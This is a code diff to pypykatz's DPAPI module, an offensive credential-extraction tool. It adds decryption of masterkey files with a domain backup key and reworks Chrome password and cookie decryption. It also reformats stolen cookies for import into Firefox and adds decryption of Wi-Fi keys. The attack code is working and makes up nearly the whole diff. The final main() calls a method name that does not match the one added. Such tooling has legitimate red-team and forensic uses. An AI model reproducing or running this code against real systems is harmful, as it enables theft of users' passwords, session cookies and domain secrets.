@@ -2,18 +2,22 @@
 #
 # Author:
 #  Tamas Jos (@skelsec)
+# 
+# Kudos:
+#  Processus Thief (@ProcessusT)
+#
 #
 
 import os
 import ntpath
 import json
 import hmac
-import hashlib
 import glob
 import sqlite3
 import base64
 import platform
 from hashlib import sha1, pbkdf2_hmac
+
 import xml.etree.ElementTree as ET
 
 from pypykatz import logger
@@ -21,11 +25,14 @@ from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
 from pypykatz.dpapi.structures.credentialfile import CredentialFile, CREDENTIAL_BLOB
 from pypykatz.dpapi.structures.blob import DPAPI_BLOB
 from pypykatz.dpapi.structures.vault import VAULT_VCRD, VAULT_VPOL, VAULT_VPOL_KEYS
-
-from pypykatz.crypto.unified.aes import AES
-from pypykatz.crypto.unified.aesgcm import AES_GCM
-from pypykatz.crypto.unified.common import SYMMETRIC_MODE
+from unicrypto.hashlib import md4 as MD4
+from unicrypto.symmetric import AES, MODE_GCM, MODE_CBC
+from winacl.dtyp.wcee.pvkfile import PVKFile
 from pypykatz.commons.common import UniversalEncoder
+
+
+from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
+
 
 if platform.system().lower() == 'windows':
 	from pypykatz.commons.winapi.processmanipulator import ProcessManipulator
@@ -165,9 +172,9 @@ class DPAPI:
 			key1 = None
 		
 		if password or password == '':
-			md4 = hashlib.new('md4')
-			md4.update(password.encode('utf-16le'))
-			nt_hash = md4.digest()
+			ctx = MD4(password.encode('utf-16le'))
+			nt_hash = ctx.digest()
+
 			# Will generate two keys, one with SHA1 and another with MD4
 			key1 = hmac.new(sha1(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), sha1).digest()
 		
@@ -335,6 +342,20 @@ class DPAPI:
 					self.prekeys[bytes.fromhex(shahex)] = 1
 				
 		return self.masterkeys
+
+	def decrypt_masterkey_file_with_pvk(self, mkffile, pvkfile):
+		"""
+		Decrypting the masterkeyfile using the domain backup key in .pvk format
+		"""
+		with open(mkffile, 'rb') as fp:
+			data = fp.read()
+		mkf = MasterKeyFile.from_bytes(data)
+		dk = mkf.domainkey.secret
+		privkey = PVKFile.from_file(pvkfile).get_key()
+		decdk = privkey.decrypt(dk[::-1], PKCS1v15())
+		secret = decdk[8:72] # TODO: proper file format would be good here!!!
+		self.masterkeys[mkf.guid] = secret
+		return self.masterkeys
 			
 	def decrypt_masterkey_file(self, file_path, key = None):
 		"""
@@ -484,9 +505,9 @@ class DPAPI:
 		def decrypt_attr(attr, key):
 			if attr.data is not None:
 				if attr.iv is not None:
-					cipher = AES(key, SYMMETRIC_MODE.CBC, iv=attr.iv)
+					cipher = AES(key, MODE_CBC, attr.iv)
 				else:
-					cipher = AES(key, SYMMETRIC_MODE.CBC, iv=b'\x00'*16)
+					cipher = AES(key, MODE_CBC, b'\x00'*16)
 				
 				cleartext = cipher.decrypt(attr.data)
 				return cleartext
@@ -638,7 +659,7 @@ class DPAPI:
 		return db_paths
 	
 	@staticmethod
-	def get_chrome_encrypted_secret(db_path):
+	def get_chrome_encrypted_secret(db_path, dbtype):
 		results = {}
 		results['logins'] = []
 		results['cookies'] = []
@@ -651,7 +672,7 @@ class DPAPI:
 			logger.debug('Failed to open chrome DB file %s' % db_path)
 			return results
 		
-		if ntpath.basename(db_path).lower() == 'cookies':
+		if dbtype.lower() == 'cookies':
 			try:
 				#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
 				cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')
@@ -662,7 +683,7 @@ class DPAPI:
 			for host_key, name, path, encrypted_value in cursor.fetchall():
 				results['cookies'].append((host_key, name, path, encrypted_value))
 
-		elif ntpath.basename(db_path).lower() == 'login data':
+		elif dbtype.lower() == 'logindata':
 
 			try:
 				#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
@@ -677,12 +698,20 @@ class DPAPI:
 		return results
 		
 	def decrypt_all_chrome_live(self):
+		dbpaths = DPAPI.find_chrome_database_file_live()
+		return self.decrypt_all_chrome(dbpaths)
+		
+		
+	def decrypt_all_chrome(self, dbpaths, throw = False):
+		from unicrypto import use_library, get_cipher_by_name
+		AES = get_cipher_by_name('AES', 'cryptography')
+
 		results = {}
 		results['logins'] = []
 		results['cookies'] = []
+		results['fmtcookies'] = []
 		localstate_dec = None
 
-		dbpaths = DPAPI.find_chrome_database_file_live()
 		for username in dbpaths:
 			if 'localstate' in dbpaths[username]:
 				with open(dbpaths[username]['localstate'], 'r') as f:
@@ -692,37 +721,40 @@ class DPAPI:
 				try:
 					localstate_dec = self.decrypt_blob_bytes(encrypted_key[5:])
 				except:
+					if throw is True:
+						raise Exception('LocalState decryption failed!')
 					# this localstate was encrypted for another user...
 					continue
 			if 'cookies' in dbpaths[username]:
-				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['cookies'])
+				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['cookies'], 'cookies')
 				for host_key, name, path, encrypted_value in secrets['cookies']:
 					if encrypted_value.startswith(b'v10'):
 						nonce = encrypted_value[3:3+12]
 						ciphertext = encrypted_value[3+12:-16]
 						tag = encrypted_value[-16:]
-						cipher = AES_GCM(localstate_dec)
-						dec_val = cipher.decrypt(nonce, ciphertext, tag, auth_data=b'') 
+						cipher = AES(localstate_dec, MODE_GCM, IV=nonce, segment_size = 16)
+						dec_val = cipher.decrypt(ciphertext, b'', tag)
 						results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val ))
+						results['fmtcookies'].append(DPAPI.cookieformatter('https://' + host_key, name, path, dec_val))
 					else:
 						dec_val = self.decrypt_blob_bytes(encrypted_value)
 						results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val ))
+						results['fmtcookies'].append(DPAPI.cookieformatter('https://' + host_key, name, path, dec_val))
 
 			if 'logindata' in dbpaths[username]:
-				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['logindata'])
+				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['logindata'], 'logindata')
 				for url, user, enc_password in secrets['logins']:
 					if enc_password.startswith(b'v10'):
 						nonce = enc_password[3:3+12]
 						ciphertext = enc_password[3+12:-16]
 						tag = enc_password[-16:]
-						cipher = AES_GCM(localstate_dec)
-						password = cipher.decrypt(nonce, ciphertext, tag, auth_data=b'')
+						cipher = AES(localstate_dec, MODE_GCM, IV=nonce, segment_size = 16)
+						password = cipher.decrypt(ciphertext, b'', tag)
 						results['logins'].append((dbpaths[username]['logindata'], url, user, password))
 					
 					else:
 						password = self.decrypt_blob_bytes(enc_password)
-						results['logins'].append((dbpaths[username]['logindata'], url, user, password ))
-				
+						results['logins'].append((dbpaths[username]['logindata'], url, user, password))
 				
 		return results
 		
@@ -786,12 +818,41 @@ class DPAPI:
 				raise Exception('Failed to obtain SYSTEM privileges! Are you admin? Error: %s' % e)
 			
 			for wificonfig in DPAPI.get_all_wifi_settings_live():
-				if 'enckey' in wificonfig and wificonfig['enckey'] != '':
-					wificonfig['key'] = self.decrypt_securestring_hex(wificonfig['enckey'])
-					yield wificonfig
+				yield self.decrypt_wifi_config_file_inner(wificonfig)
 
 		finally:
 			pm.dropsystem()
+
+	def decrypt_wifi_config_file_inner(self, wificonfig):
+		if 'enckey' in wificonfig and wificonfig['enckey'] != '':
+			wificonfig['key'] = self.decrypt_securestring_hex(wificonfig['enckey'])
+			return wificonfig
+	
+	def decrypt_wifi_config_file(self, configfile):
+		wificonfig = DPAPI.parse_wifi_config_file(configfile)
+		return self.decrypt_wifi_config_file_inner(wificonfig)
+	
+	@staticmethod
+	def cookieformatter(host, name, path, content):
+		"""This is the data format the 'Cookie Quick Manager' uses to load cookies in FireFox"""
+		return {
+			"Host raw": host,      #"https://.pkgs.org/",
+			"Name raw": name,      #"distro_id",
+			"Path raw": path,      #"/",
+			"Content raw": content,   # "196",
+			"Expires": "26-05-2022 21:06:29",       # "12-05-2022 15:59:48",
+			"Expires raw": "1653591989",   # "1652363988",
+			"Send for": "Any type of connection", #"Encrypted connections only",
+			"Send for raw": False,  #"true",
+			"HTTP only raw": False, #"false",
+			"SameSite raw": "lax", #"lax",
+			"This domain only": False, #"Valid for subdomains",
+			"This domain only raw": False, #"false",
+			"Store raw": "firefox-default", #"firefox-default",
+			"First Party Domain": "", #""
+		}
+
+
 
 # arpparse helper
 def prepare_dpapi_live(methods = [], mkf = None, pkf = None):
@@ -810,3 +871,13 @@ def prepare_dpapi_live(methods = [], mkf = None, pkf = None):
 		dpapi.get_masterkeys_from_lsass_live()
 	
 	return dpapi
+
+def main():
+	mkffile = '/mnt/hgfs/!SHARED/feature/masterkeyfile - 170d0d57-e0ae-4877-bab6-6f5af49d3e8e'
+	pvkfile = '/mnt/hgfs/!SHARED/feature/pvkfile - ntds_capi_0_fdf0c850-73d3-48cf-86b6-6beb609206c3.keyx.rsa.pvk'
+	dpapi = DPAPI()
+	dpapi.decrypt_mkf_with_pvk(mkffile, pvkfile)
+
+
+if __name__ == '__main__':
+	main()
